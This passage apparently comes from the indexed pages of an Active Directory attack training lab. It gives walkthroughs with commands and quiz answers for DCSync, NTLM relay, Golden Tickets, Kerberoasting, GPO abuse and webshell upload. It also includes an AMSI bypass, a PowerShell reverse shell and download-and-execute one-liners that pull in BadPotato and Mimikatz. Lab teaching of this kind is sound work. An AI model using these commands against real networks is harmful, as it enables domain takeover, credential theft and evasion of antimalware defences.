to such services should be very well protected, to prevent these scenarios.</p>"},{"location":"labs/single-domain-attacks/DCSync/","title":"DCSync","text":"<p>A DCSync attack is used for extracting domain secrets. An attacker can execute such an attack when it reaches domain admin privileges for example. Once this attack is executed, an attacker will hold every domain account credential, having fully compromised the domain.</p> <p>To execute this attack, you can use the Administrator password, supposedly retrieved in the LLMNR poisoning attack, and the 'secretsdump.py' Impacket script: <pre><code>secretsdump.py -just-dc Administrator:Passw0rd@captain.polaris.local\n</code></pre></p> <p>And just like that, you've compromised the polaris.local domain.</p> <p>Question</p> <p>Is the Administrator password required to DCSync?</p> Answer <p>No. Any principal with the Replicating Directory Changes/Replicating Directory Changes All extended rights can DCSync.</p> <p>Question</p> <p>What kinds of credentials are retrieved through a DCSync attack?</p> Answer <p>NTLM password hashes, Kerberos long-term keys, and entries for users and machine accounts (such as  CAPTAIN$ and krbtgt). No cleartext passwords are retrieved.</p> <p>Question</p> <p>What does the krbtgt account represent and what can an attacker do with its credentials?</p> Answer <p>The krbtgt account is the built-in account the domain\u2019s KDC uses to sign and encrypt TGTs. If an attacker gets its credentials, they can forge Golden Tickets to impersonate any user and request any service tickets at will.</p>"},{"location":"labs/single-domain-attacks/DropTheMIC/","title":"Drop the MIC attack","text":"<p>This attack targets the NTLM protocol. It also relays authentication from a legitimate client to a legitimate server, but this time, the messages no longer target the SMB service, but the LDAPS service. LDAPS can be used to alter the AD database and doesn't enforce singing by default on DCs, contrary to the SMB service. The attacker hijacks NTLM authentication messages being sent to access an SMB service, and alters them to access LDAPS instead. In order to do so, they must remove the Message Integrity Code (MIC) from NTLM messages. Hence the attack's name.</p> <p>This attack also makes use of two different terminals, just like the NTLM relay attack. This attack will relay authentication from the MEMBER machine to the CAPTAIN machine, and use it to create a new computer account, as well as grant this new computer account RBCD privileges to MEMBER, which means that the new computer account can impersonate any user to access any service provided by the MEMBER machine, essentially compromising it.</p> <p>First, in one terminal run: <pre><code>ntlmrelayx.py -t ldaps://captain.polaris.local --remove-mic --add-computer removemiccomputer --delegate-access \n</code></pre></p> <p>This script will relay NTLM messages that are originally meant for an SMB service to the LDAPS service from the MEMBER machine to the CAPTAIN machine, and automatically create the new computer account and grant it RBCD privileges in MEMBER.</p> <p>In a second terminal, run: <pre><code>#in the krbrelayx dir\npython3 printerbug.py POLARIS/skyler.white:Password123@192.168.122.5 192.168.122.2 \n</code></pre> This script uses the printer bug in order to coerce authentication from the MEMBER machine to the attacker's machine, allowing the attacker to relay MEMBER's NTLM messages to LDAPS in the DC.</p> <p>Take note of the newly created computer account on the ntlmrelayx script output. You can now use this account to impersonate the Administrator to a MEMBER machine service, as per RBCD normal behavior:</p> <pre><code>getST.py -dc-ip 192.168.122.10 -impersonate Administrator -spn cifs/member.polaris.local polaris/removemiccomputer\\$:'&lt;passwordfromntlmscript&gt;'\n#set the KRB5CCNAME environment variable to the new ticket\nexport KRB5CCNAME=/your/current/directory/Administrator.ccache\n#now you can access the SMB service as the Administrator user on MEMBER\npsexec.py -k -no-pass member.polaris.local\nwhoami\n</code></pre> <p>Question</p> <p>What's the purpose of targetting the LDAPS service instead of the SMB service in this attack?</p> Answer <p>The LDAPS does not enforce signing by default, in contrary to SMB. Removing the MIC while using a service that enforces signing won't work. That's why the LDAPS service is targetted in this attack.</p> <p>Question</p> <p>Why can we configure the newly computer account with RBCD privileges against the MEMBER machine?</p> Answer <p>We can configure RBCD in this manner since we're using an authenticated MEMBER connection, which can configure RBCD related to itself (Resource-Based Constrained Delegation).</p>"},{"location":"labs/single-domain-attacks/GPOabuse/","title":"GPO Abuse","text":"<p>While performing the ACL abuse attack (please do), you might have noticed that the Hank user account has 'GenericAll' access rights over a GPO, through the use of the BloodHound tool. Group Policy Objects (GPOs) are used to enforce specific settings across Organizational Units in AD. These range from critical configurations,  such as such as logon scripts, startup commands, software deployment, registry edits, and even scheduled tasks, all of which are executed with SYSTEM privileges on the targeted machines.</p> <p>GPOs can also be used for more 'futile' reasons, such as setting wall papers across every computer. It seems that this is the case in our environment, as we can see through the BloodHound GUI by using the Cypher query specified in the ACL section.</p> <p>Since we've compromised Hank's account in the ACL attack, let's use it to abuse the GPO. As aforementioned, GPOs can create scheduled tasks that run under the SYSTEM security context. As the attacker, we can create a scheduled task leveraging the 'GenericAll' access right that Hank holds on the GPO, and for example, create a new user and add it to the Domain Admins group!</p> <p>We'll use the pyGPOabuse.py script, which automates this process. We'll use Hank's TGT, which you can retrieve by executing the Shadow Credentials attack, as specified in the ACLs section. You'll also need to retrieve the GPO's ID, which can be done through the BloodHound GUI. Click the GPO's node and look at the GPO's Distinguished Name on the right. That's where you'll get its ID. <pre><code>#replace the GPO ID with the one present in your BloodHound GUI, place the hank.schrader.ccache file in the pyGPOAbuse dir, set the KRB5CCNAME var to the .ccache file, and from there run:\npython3 pygpoabuse.py -k -ccache hank.schrader.ccache polaris.local/hank.schrader -gpo-id B2DBE2C2-9880-444B-A950-97072C096554 -dc-ip captain.polaris.local\n</code></pre></p> <p>You can execute the command \"gpupdate /force\" as the Administrator on CAPTAIN or wait for a while in order for the GPO to run the scheduled task. After the task is executed, a user account named \u201cjohn\u201d with password \u201cH4x00r123..\u201d will exist in the domain and be part of the Domain Admins group. We can confirm if the account is active with crackmapexec, as well as dump domain secrets with this new account.</p> <pre><code>#confirm that the account exists\ncrackmapexec smb 192.168.122.10 -u john -d polaris.local -p H4x00r123..\n#dump domain secrets\nsecretsdump.py -just-dc john:H4x00r123..@captain.polaris.local\n</code></pre> <p>Question</p> <p>What is a Group Policy Object and what is its purpose in an Active Directory environment?</p> Answer <p>A Group Policy Object (GPO) is a collection of policy settings that can be applied in AD. They're used to enforce specific configurations across users and computers within a domain. Its purpose is to centralize the management of settings. GPOs can apply to Organizational Units (OUs), domains, or sites, allowing administrators to control environments automatically.</p> <p>Question</p> <p>What types of critical configurations can be applied through GPOs?</p> Answer <p>GPOs can enforce a wide range of critical configurations, including logon and logoff scripts, startup and shutdown commands, software deployment, registry modifications, and security policies (such as password requirements and account lockouts).</p> <p>Question</p> <p>How can you identify that a user has permissions over a GPO in BloodHound?</p> Answer <p>In BloodHound, you can identify GPO permissions by running specific Cypher queries in the GUI. When analyzing a user node like Hank, you can check if they have access rights such as GenericAll, WriteDacl, or WriteOwner over a GPO object. This appears in the relationship graph, as the link between the GPO and Hank's node. </p>"},{"location":"labs/single-domain-attacks/GoldenTickets/","title":"Golden Tickets","text":"<p>Golden Tickets are a persistence attack in AD. They consist of TGTs that are forged by the attacker using the krbtgt's account hash. This hash value is used for deriving Kerberos keys, which are in turn used for creating and issuing TGTs. If the attacker can retrieve this account's hash, the attacker can then forge a Kerberos TGT with arbitrary information. Using this forged ticket, the attacker can then access domain services however he likes.</p> <p>In order to retrieve the krbtgt's hash value, you'll need admin access to the domain. This can be achieved by performing previous attacks in this lab such as the ACL Abuse attack, the SAMAccountName spoofing attack, the NTLM relay to SMB attack, and more. If for some reason you weren't able to retrieve the administrator's hash values, run the following command, and take note of the hash value.</p> <pre><code>secretsdump.py -just-dc-user 'Administrator' polaris.local/Administrator:Passw0rd@192.168.122.10 \n</code></pre> <p>To forge a Golden Ticket: <pre><code>#retrieve the polaris.local domain's SID\nlookupsid.py -no-pass -hashes &lt;admin:hashes&gt; -domain-sids polaris.local/Administrator@192.168.122.10 0\n#get the krbtgt account hash\nsecretsdump.py -just-dc-user 'krbtgt' polaris.local/administrator@192.168.122.10 -hashes &lt;admin:hashes&gt;\n#example output\n#[+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:640464e963ce78864650de778a6b9c31:::\n#in the command below, you must use the NT hash, which in the example output i gave you, is the second value (640464e963ce78864650de778a6b9c31)\nticketer.py -nthash &lt;krbtgt's NTHash&gt; -domain-sid &lt;domain SID&gt; -domain polaris.local Administrator\n#At this point you've crafted a golden ticket, a TGT referencing the administrator account, which can be used to access any service in the domain as the administrator, for a long period of time\nexport KRB5CCNAME=/your/dir/Administrator.ccache\n#Create a shell session using the forged ticket with administrator permissions\nwmiexec.py -k -no-pass polaris.local/Administrator@captain.polaris.local\nwhoami\n</code></pre></p> <p>Question</p> <p>What is a Golden Ticket in Active Directory?</p> Answer <p>A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the krbtgt account\u2019s NT hash. With it, an attacker can impersonate any user, including Domain Admins, and access domain resources at will.</p> <p>Question</p> <p>Why is the krbtgt account hash required to forge a Golden Ticket?</p> Answer <p>The krbtgt account hash is the secret key the KDC uses to sign and validate TGTs. If an attacker has this hash, they can generate valid-looking TGTs that the KDC will accept as legitimate.</p> <p>Question</p> <p>How can an attacker retrieve the krbtgt account hash?</p> Answer <p>The attacker needs domain admin\u2013level access to dump the krbtgt account credentials. This can be achieved through other attacks such as ACL abuse, SAMAccountName spoofing or NTLM relay to SMB.</p>"},{"location":"labs/single-domain-attacks/IIS/","title":"IIS Misconfiguration Abuse","text":"<p>The Internet Information Services (IIS) is Microsoft's web server software, used to host websites, web applications, and more. If there are vulnerable endpoints hosted through IIS, an attacker may exploit the service, reaching for example, Remote Command Execution.</p> <p>In the Network Reconnaissance section of the lab, we've determined that there's an HTTP endpoint served at CAPTAIN called \"Simple Uploader\". Maybe it is a vulnerable endpoint. At first glance this endpoint allows users to upload arbitrary files to the DC through HTTP. If uploaded files can be accessed through HTTP as well, it presents a dangerous situation for the domain. If an attacker can upload a file and then access it through HTTP, the attacker can upload for example a webshell, and use it to run commands remotely. Let's take a look:</p> <pre><code>curl -X GET http://192.168.122.10\n</code></pre> <p>This confirms that we can upload files to this endpoint, it seems. Let's then upload the 'webshell.aspx' file, present in the webshell directory: <pre><code>#in the webshell directory\ncurl -X POST http://192.168.122.10 -F \"file=@webshell.aspx\"\n</code></pre></p> <p>Now, let's try and access the file we've just uploaded. Maybe it's saved on a folder named 'upload'? <pre><code>curl -X GET http://192.168.122.10/upload/webshell.aspx\n</code></pre></p> <p>Yes! We can access our webshell! Now we can execute commands through HTTP. Let's try it: <pre><code>curl -X POST http://192.168.122.10/upload/webshell.aspx -d \"param=whoami\"\n</code></pre></p> <p>This way, we've reached remote command execution at the DC under the the context of the IIS Application Pool Identity (IIS APPPOOL\\DefaultAppPool), which is the account IIS assigns to isolate each web application.</p> <p>Question</p> <p>What has the attacker compromised in this attack?</p> Answer <p>The attacker has gained remote command execution on the Domain Controller (DC) through a vulnerable IIS web application that allows file uploads and HTTP access to uploaded files. By uploading a webshell and accessing it via HTTP, the attacker can now execute commands on the server under the security context of the IIS Application Pool Identity. At this point, the domain hasn't been compromised. </p>"},{"location":"labs/single-domain-attacks/Kerberoasting/","title":"Kerberoasting","text":"<p>This attack is similar to AS-REP roasting. In AS-REP roasting, the attacker retrieves a user's TGT since this user does not require Kerberos pre-authentication. In this case, the attacker will retrieve a TGS for a determined service and crack the service's account password offline, since TGSs are ciphered using the service's account password, like how TGTs are ciphered with user account passwords.</p> <p>The target of a Kerberoasting attacks are user accounts with an associated SPN. Regular service accounts, such as accounts used by IIS or MSSQL services have long, random passwords that change regularly. User accounts with an associated SPN, however, may have common passwords that are relatively easy to crack, thus being the preferable targets for this attack.</p> <p>First, the attacker will then look for user accounts that have an associated SPN using Impacket, for example:</p> <pre><code>GetUserSPNs.py -dc-ip 192.168.122.10 polaris.local/skyler.white:Password123 -outputfile kerberoasting.hashes\n</code></pre> <p>It seems that we were able to retrieve Walter White's ciphered TGS, and using hashcat along with passwords.txt once again, we may be able to crack its password:</p> <pre><code>#remember hashcat and GNS3 VMs aren't friends, i suggest you install hashcat on your machine.\nhashcat -m 13100 kerberoasting.hashes ./passwords.txt --force --quiet\n</code></pre> <p>Question</p> <p>Can this attack be perpetrated against any account in AD?</p> Answer <p>No, this attack can only be perpetrated against service accounts. Preferebly, user accounts with an associated SPN.</p> <p>Question</p> <p>Does the attacker need user credentials to perpetrate this attack?</p> Answer <p>Yes, the attacker needs to be able to request a TGS to access the target service account. This can only be done by first authenticating as some other account, requiring credential access.</p>"},{"location":"labs/single-domain-attacks/LDAPDump/","title":"Authenticated AD Reconnaissance","text":"<p>Once the attacker gains a foothold on a domain, by having acquired some user credentials, there's a wide-range of information an attacker can access.</p> <p>For example, the attacker can now retrieve every other user account in the domain: <pre><code>GetADUsers.py -all polaris.local/skyler.white:Password123 -dc-host CAPTAIN\n</code></pre></p> <p>Through tools like ldapsearch, it's possible to issue direct LDAP queries against the directory without relying on higher-level scripts or wrappers. <pre><code>#obtain information on all users\nldapsearch -H ldap://192.168.122.10 -D 'skyler.white@polaris.local' -w Password123 -b 'DC=polaris,DC=local' '(&amp;(objectCategory=person)(objectClass=user))'\n#List all AS-REP roastable users\nldapsearch -H ldap://192.168.122.10 -D 'skyler.white@polaris.local' -w Password123 -b 'DC=polaris,DC=local' '(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'\n#List all Kerberoastable users\nldapsearch -H ldap://192.168.122.10 -D 'skyler.white@polaris.local' -w Password123 -b 'DC=polaris,DC=local' '(&amp;(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'\n#Retrieve GPO information\nldapsearch -H ldap://192.168.122.10 -D 'skyler.white@polaris.local' -w Password123 -b 'CN=Policies,CN=System,DC=polaris,DC=local' '(objectClass=groupPolicyContainer)'\n</code></pre></p> <p>Many other types of information can be retrieved via LDAP using only low-privileged, valid credentials. LDAP serves as a core data source for auditing and reconnaissance in AD environments. Tools designed for AD security assessments rely on LDAP to collect details about users, group memberships, ACLs, computer objects, GPOs, trust relationships, and more. This makes LDAP a powerful resource for mapping out and auditing the entire domain structure.</p> <p>An attacker with authenticated access to AD can also check file shares. With new credentials, the attacker might have access to different shares, which may contain information on the AD environment.</p> <p><pre><code>crackmapexec smb 192.168.122.10 -u 'skyler.white' -p 'Password123' --shares\n</code></pre> With skyler's credentials, we have access to new shares! Let's take a peak.</p> <pre><code>smbclient //192.168.122.10/ImportantNotes -U 'skyler.white'\n#Enter 'Password123' when the password is requested\nls \nget note.txt\nexit\ncat note.txt\n</code></pre> <p>Seems like we've caught a little note the Administrator left for his employees. Not much we can work with, unfortunately.</p> <p>Question</p> <p>How useful are LDAP queries to attackers and what do they require? </p> Answer <p>LDAP queries are very useful for attackers. They allow an attacker to enumerate users and groups, identify attack targets (AS-REP roastable and Kerberoastable accounts), dicover trust relationships, and more. To access LDAP and issue queries, an attacker needs valid account credentials. Even low-privileged credentials are enough as by default most directory information in Active Directory can be read by any authenticated user.</p> <p>Question</p> <p>Once new usernames are retrieved by leveraging valid credentials and LDAP, what attacks can now be used in order to uncover their passwords?</p> Answer <p>With the usernames, the attacker can now try Password Spraying, AS-REP roasting, or Kerberoasting attacks to potentially retrieve new passwords.</p>"},{"location":"labs/single-domain-attacks/LLMNR-poisoning/","title":"LLMNR poisoning","text":"<p>The objective of this attack is to trick a client into authenticating to an attacker machine through means of LLMNR poisoning. LLMNR is a hostname resolution protocol used in AD as a fallback when DNS name resolution fails. It works by sending multicast requests to machines in the same network, asking for the hostname's IP address that DNS failed to provide.</p> <p>This can occur when, for example, a user mistypes some server name. If a user for example tries to access a server named \"CAPTAIN\", but insteads tries to access a server named \"CAPTSIN\" by mistake, the DNS won't be able to resolve this hostname, and thus LLMNR is triggered. Attackers then can take advantage of this mistake, and reply to the client indicating that the \"CAPTSIN\" hostname resolves to the attacker's own IP address. This way, the client is tricked into authenticating to the attacker's machine.</p> <p>In order to listen for LLMNR requests and poison them, the 'Responder' tool can be used. In the Responder directory, run: <pre><code>sudo -E python3 Responder.py -I ens3\n</code></pre></p> <p>Now, wait for some client to look for a server that doesn't exist. We've heard that Hank and the Administrator like to write super fast, maybe they'll both press the wrong key when accessing some server. The LLMNR poisoning attack can be used to retrieve NTLM responses from victims. These responses can be used in offline password cracking. Once you've captured the hashes, save them to a file named \"responder.hashes\" and using the NTLMHashCracking.txt file, conduct a password cracking attempt with Hashcat:</p> <pre><code>#Remember, GNS3 VMs and hashcat don't get along. I suggest installing hashcat on your machine\nhashcat -m 5600 --force -a 0 responder.hashes NTLMHashCracking.txt --quiet\n</code></pre> <p>If you're lucky, you might crack some password.</p> <p>Question</p> <p>Can the attacker perform this attack without user credentials? Why?</p> Answer <p>Yes, since LLMNR requests are sent to the network. Attackers can listen to these requests and simply send spoofed replies without needing credentials.</p> <p>Question</p> <p>How can the attacker crack the password? Keep in mind how the NTLM authentication is conducted and what is exchanged between client and server.</p> Answer <p>The attacker might be able to crack the password since the attacker conducts the NTLM authentication process with the victim. This results in the attacker having knowledge of both the challenge and the response used to authenticate the client. Thus, the attacker will know both the plaintext nonce as well as the hashed nonce, being able to conduct an offline dicionary attack to recover the victim's plaintext password. The attacker will use different passwords and use them to hash the plaintext nonce. If the hashed value is equal to the hashed nonce sent by the client, the attacker has successfully cracked the user's password.</p>"},{"location":"labs/single-domain-attacks/LocalPrivilegeEscalation/","title":"Local Privilege Escalation","text":"<p>In this attack, we'll leverage remote command execution under a service account security context to compromise the Domain Controller locally. To reach remote command execution position perform the IIS abuse attack, also present in this lab.</p> <p>Once the attacker achieves remote command execution under the IIS service Application Pool Identity, the next objective is to establish a reverse shell. This is because the uploaded webshell can only run single, stateless commands. It does not maintain a persistent session. To gain more control and flexibility, the attacker needs to spawn a reverse shell that allows interactive command execution and session management.</p> <p>To do so, run the following: <pre><code>#in the webshell directory\npython3 reverse_shell_command.py 192.168.122.2 4444\n</code></pre></p> <p>This script outputs a powershell command encoded in B64, for obfuscation and to prevent special character issues. The command will initiate a TCP connection from the machine running the command to port 4444 at IP 192.168.122.2 (the attacker), and listen for powershell commands.</p> <p>We can get the output from the command, and send it to our webshell endpoint. Before doing so, we'll use netcat to start listening for a connection in port 4444 of the attacker machine. <pre><code>#in the attacker2 terminal\nnc -nlvp 4444\n#in the attacker terminal\ncurl -X POST http://192.168.122.10/upload/webshell.aspx --data-urlencode \"param=&lt;output from reverse_shell_command.py&gt;\"\n</code></pre></p> <p>At this point, you've supposedly received a connection in port 4444, meaning the reverse shell has been set up and now you can run commands on a single persistent session, instead of running stateless commands.</p> <p>The attacker's objective will be to run a mallicious script that uses service account privileges to reach SYSTEM privileges. To be able to run mallicious scripts, AMSI must be bypassed. Anti-Malware Scan Interface scans scripts before execution and prevents it if they're suspicious. AMSI also prevents certain well-known scritps from running. Take a look:</p> <pre><code>Invoke-Mimikatz\necho $Error[0].Exception.Message\n</code></pre> <p>The error message tells us that this script can't be run due to mallicious content. Let's try and bypass AMSI in the current powershell process to see if anything different happens: <pre><code>$w=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$f=$w.GetField('amsiInitFailed','NonPublic,Static');\n$f.SetValue($null,$true)\n\nInvoke-Mimikatz\necho $Error[0].Exception.Message\n</code></pre></p> <p>This time, we've set the amsiInitFailed flag to true, which indicates powershell that AMSI has failed. Now, powershell won't call AMSI since it has supposedly failed. If you try to run Invoke-Mimikatz again, you'll now get a different error, indicating that there's no such cmdlet, meaning that the AMSI has been bypassed in this session.</p> <p>Now, the attacker's objective is to bypass AMSI at the .NET level. At this point, the AMSI has been bypassed in the current Powershell session, but the mallicious script we wish to use down the line uses other AMSI-aware processes, namely, C# executables. If we don't bypass AMSI at the .NET level, AMSI will stop our mallicious script from executing.</p> <p>To bypass AMSI at the .NET level, we'll use 'amsi-net-bypass.txt', present in the webshell directory. <pre><code>#In the Attacker terminal\npython3 -m http.server 8081\n#In the Attacker2 terminal\n(new-object system.net.webclient).downloadstring('http://192.168.122.2:8081/amsi-net-bypass.txt')|IEX\n</code></pre> This way, we've loaded the 'amsi-net-bypass.txt' into memory and executed it. It should output 'True', meaning that it worked. Important to notice that we've loaded the script into memory, not into disk. Loading mallicious scripts to disk may trigger Anti-Virus tools, so it's imperative to work only in memory.</p> <p>At this point, the attacker can run mallicious scripts, as long as these scripts do not touch the disk. Let's now escalate our privileges locally, going from the IIS service security context to the SYSTEM security context. This will be done with the 'Invoke-BadPotato.ps1' script:</p> <pre><code>iex(new-object net.webclient).downloadstring('http://192.168.122.2:8081/PowerSharpPack/PowerSharpBinaries/Invoke-BadPotato.ps1')\nInvoke-BadPotato\n[System.Security.Principal.WindowsIdentity]::GetCurrent().Name\n#you can also experiment with other tools such as Mimikatz\niex(new-object net.webclient).downloadstring('http://192.168.122.2:8081/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz -Command \"sekurlsa::tickets\"\n</code></pre> <p>This way, an attacker is able to escalate its privileges locally, from a service account security context to the SYSTEM security context, having full control over the DC, in this case.</p> <p>Question</p> <p>Why is it necessary to establish a reverse shell instead of using the webshell directly?</p> Answer <p>In order to be able to maintain a session state. If otherwise the attacker would for example bypass AMSI through the webshell, state would not be maintained, so it would be as nothing was bypassed, rendering this attack useless.</p> <p>Question</p> <p>What technique does Invoke-BadPotato use to escalate privileges?</p> Answer <p>Invoke-BadPotato escalates privileges by exploiting Windows services that run as SYSTEM and improperly handle token impersonation. It leverages the Printer Bug to trick a SYSTEM-level process to authenticate to an attacker-controlled named pipe. This will allow the attacker to impersonate the SYSTEM access token and spawn a process with SYSTEM-level privileges. This technique requires the attacker's compromised account to hold the SeImpersonatePrivilege, which is commonly available to service accounts like those used by IIS.</p>"},{"location":"labs/single-domain-attacks/MSSQL/","title":"MSSQL Misconfiguration Abuse","text":"<p>Microsoft SQL can often be employed in AD environments. MSSQL servers integrate with AD, allowing AD credentials to be used to authenticate to MSSQL databases. There are possible MSSQL misconfigurations that can lead to an Remote Command Execution position for an attacker. </p> <p>In the Network Reconnaissance section, we determined that CAPTAIN provided MSSQL services. We can check again with nmap: <pre><code>#MSSQL runs in port 1433\nnmap -Pn -p 1433 -sV -sC 192.168.122.10 192.168.122.5\n</code></pre></p> <p>We've previously uncovered skyler.white's user account credentials. Let's use it to try and access CAPTAIN's MSSQL instance: <pre><code>#in the mssql scripts dir\npython3 ./mssqlclient.py -windows-auth polaris.local/skyler.white:Password123@captain.polaris.local\n</code></pre> This script displays a shell that the attacker can use to interact with the MSSQL server. Executing the command \u201chelp\u201d will display possible commands.</p> <p>In our session, we can first enumerate logins. By executing the \u201cenum_logins\u201d command we can see which logins are possible in the CAPTAIN MSSQL service: <pre><code>enum_logins\n</code></pre> We see that there\u2019s the sa user, or sysadmin, the login with highest privileges in the MSSQL server, the BUILTIN\\Users Windows group, and two POLARIS domain members, skyler.white and walter.white.</p> <p>MSSQL allows users to impersonate others while using the service. This configuration is done manually by administrators and if too permissive, an attacker can abuse them. The mssqlclient script can enumerate impersonation configurations with the \u201cenum_impersonate\u201d command.  <pre><code>enum_impersonate\n</code></pre></p> <p>We can see that impersonation is allowed in this server. User walter.white allows skyler.white to impersonate him. This way, a user authenticating as Skyler can execute commands with Walter\u2019s privileges. We also can see that walter.white can impersonate the sa login, thus being able to execute commands with sa privileges. This impersonation chain allows an attacker to escalate from an unprivileged user to the sa account within the MSSQL server.</p> <pre><code>exec_as_login POLARIS\\walter.white\nexec_as_login sa\n</code></pre> <p>The sa account has enough privileges to enable the 'xp_cmdshell' stored procedure within the MSSQL server. This stored procedure essentially executes arbitrary Windows shell commands through SQL queries. Enabling this procedure will then allow the attacker to execute commands as the MSSQL service account. <pre><code>enable_xp_cmdshell\nxp_cmdshell whoami\n</code></pre></p> <p>This way, abusing impersonation misconfigurations, an attacker can execute commands remotely under the MSSQL service account security context.</p> <p>Question</p> <p>What can administrators do to prevent this type of abuse?</p> Answer <p>Administrators should carefully monitor impersonation permissions within MSSQL servers, not allowing a low-privilege user to impersonate high-privilege accounts directly (Skyler -&gt; sa), nor through other impersonation capabilities (Skyler -&gt; Walter -&gt; sa). Impersonation paths should be carefully configured. </p> <p>Question</p> <p>What has the attacker compromised in this attack?</p> Answer <p>The attacker has gained remote command execution on the MSSQL server by abusing impersonation and enabling xp_cmdshell, allowing them to execute commands under the MSSQL service account context. At this stage, the domain is not compromised.</p>"},{"location":"labs/single-domain-attacks/NTLMrelaySMB/","title":"NTLM relay","text":"<p>An NTLM relay attack focuses on intercepting NTLM messages sent from a legitimate client trying to access some service, modifying them, and redirecting them to a legitimate server, impersonating the original client. This attack can be perpetrated by an attacker which positions themselves between the server and the client (MITM).</p> <p>This MITM position can be reached through the use of the LLMNR poisoning attack, for example, also addressed in this lab.</p> <p>In order to perpetrate this attack, two terminals will be used. In order to use two terminals, access the \"Attacker2\" machine and execute the following: <pre><code>ip add add 192.168.122.35/24 dev eth0\nssh ubuntu@192.168.122.2\n#introduce ubuntu's password (it's 'ubuntu')\n</code></pre></p> <p>Now, onto the attack. This attack will only work against machines that have SMB signing disabled. To check which machines are vulnerable, execute the following: <pre><code>crackmapexec smb 192.168.122.0/24\n</code></pre> It seems that both MEMBER and CAPTAIN have SMB signing disabled, both being susceptible to this attack.</p> <p>To perpetrate this attack, first change the 'Responder.conf' file content to what can be seen in  Responder.conf.txt. Then, create a file named 'targets.txt' with the contents seen in  targets.txt. Now, in one terminal:</p> <p><pre><code>ntlmrelayx.py -tf targets.txt -socks -smb2support\n#if you see some permission error upon running this script, do the following\nreadlink -f $(which python3)\nsudo setcap cap_net_bind_service=+ep &lt;output from the last command&gt;\n</code></pre> Once the ntlmrelayx.py script is listening for incoming NTLM messages, on a different terminal, start the Responder tool, which will poison legitimate clients through LLMNR, which will result in the client sending NTLM messages to the attacker.</p> <p><pre><code>#in the Responder directory\nsudo -E python3 Responder.py -I ens3\n</code></pre> After waiting for +/- 5 minutes, you should now have relayed authentication from both the Administrator and Hank accounts to the CAPTAIN DC. In order to verify relayed connections, run the following: <pre><code>#in the ntlmrelayx terminal\nsocks\n</code></pre> This command will output connections that can be used through a SOCKS5 proxy. You can now perform a DCSync attack using the Administrator connection, since this account has the necessary permissions to replicate DC data. With the DCSync, you retrieve every domain credential, compromising the domain. For this, use the secretsdump.py script from Impacket, along with the proxychains4 tool, in order to use the SOCKS proxy, and therefore, the Administrator's connection (Do not stop the ntlmrelayx script from running, stop the Responder tool and use that same terminal): <pre><code>sudo -E proxychains4 $(which secretsdump.py) -no-pass -use-vss POLARIS/Administrator@192.168.122.10\n</code></pre></p> <p>This way, just by relaying NTLM messages, an attacker is able to compromise the whole domain.</p> <p>Question</p> <p>How was the attacker able to position itself between the client and the server? </p> Answer <p>The MITM position was reached through LLMNR poisoning through the Responder tool. The Responder tool listens for legitimate LLMNR requests and issues poisoned replies to clients, indicating that the server that the client wants to access is in fact the attacker machine. This way the attacker can position itself between the client and server.</p> <p>Question</p> <p>What's the role of the SOCKS proxy in this attack?</p> Answer <p>In this attack, the attacker establishes a SOCKS5 proxy on their own machine, bound to the context of the compromised session (Admin/Hank's) by means of a NTLM relay attack. Tools like proxychains then route traffic through this proxy, making it appear as if requests originate from the relayed host. This enables the attacker to directly access internal services\u2014such as dumping credentials with secretsdump.py\u2014using the victim\u2019s authenticated session.</p>"},{"location":"labs/single-domain-attacks/Network-Reconnaissance/","title":"Network Reconnaissance","text":"<p>An attacker that's able to access a Windows Active Directory network (192.168.122.0 in our case) must first retrieve some information through the network itself.</p> <p>This information is crucial for determining the next steps for the attacker. The attacker will start by assessing which Windows machines are present in the network. Then, it is important to determine which of these machines are Domain Controller's. Other than this information, an attacker may also assess which services are provided by Windows machines, which can provide an attacker with potentially vulnerable entry points.</p> <p>To look for Windows machines in the network, the CrackMapExec tool may be used. Through the tool's SMB module, the attacker can scan the network for Windows machines and retrieve information about them:</p> <pre><code>crackmapexec smb 192.168.122.0/24\n</code></pre> <p>The tool will output different Windows machines that are present in the network. You can identify the different Windows machines' hostnames, IP addresses, and domains, and whether they're using SMBv1 or not, as well as if they have SMB signing enabled.</p> <p>Once different machines are identified, the attacker can get to finding out which machines are Domain Controller's, the prime target in AD environments. To do so, the attacker can make use of 2 protocols: DNS and DHCP. DNS is imperative in any AD domain, and can be used to find services hosted exclusevely by DCs. DHCP, on the other hand, isn't required in AD domains but there are DHCP servers running more often than not. Besides providing an IP address, the DHCP server usually indicates the DNS server to clients, so these are able to resolve hostnames. In order to find the DNS server, we'll first use nmap and DHCP:</p> <p><pre><code>sudo nmap --script broadcast-dhcp-discover\n</code></pre> Through the output we can see that the DNS server is hosted at 192.168.122.10. This indicates that the 192.168.122.10 machine can be the DC, but it's not certain since DNS servers can be hosted on machines other than DCs. However, there are services that only DCs provide like Kerberos and LDAP. Thus, in order to confirm the DC's IP address, the attacker can lookup Kerberos/LDAP service records in order to assess which machine provides such services:</p> <pre><code>nslookup -type=srv _ldap._tcp.dc._msdcs.polaris.local 192.168.122.10\nnslookup -type=srv _kerberos._tcp.dc._msdcs.polaris.local 192.168.122.10\n</code></pre> <p>It seems that both LDAP and Kerberos are provided by CAPTAIN (192.168.122.10), confirming that the CAPTAIN machine is our polaris.local DC.</p> <p>The attacker can then scan the network for services provided by the different machines. This services can be misconfigured or present some vulnerability, which the attacker can take advantage of.</p> <pre><code>nmap -Pn -p- -sC -sV -oA full_scan 192.168.122.10,5\n</code></pre> <p>This command may take a while. The output shows us different services running on these machines.</p> <p>Question</p> <p>How many Windows machines are in the network? What about domains?</p> Answer <p>There are 2 Windows machines: MEMBER and CAPTAIN. There is a single domain: polaris.local.</p> <p>Question</p> <p>Why is that the attacker should query certain service records instead of assuming the DNS server's IP address is the DC's IP address?</p> Answer <p>Because the DNS service may be hosted elsewhere, while the Kerberos and LDAP services are hosted by DCs exclusively.</p> <p>Question</p> <p>Is the Microsoft SQL service present on any machine? Which ones? What about the IIS service? Can you find any HTTP endpoint that's reachable on any machine?</p> Answer <p>Yes, the MSSQL service is provided by CAPTAIN. The CAPTAIN machine also hosts an HTTP enpoint named \"Simple Uploader\".</p>"},{"location":"labs/single-domain-attacks/PrintNightmare/","title":"PrintNightmare Attack","text":"<p>In this attack, 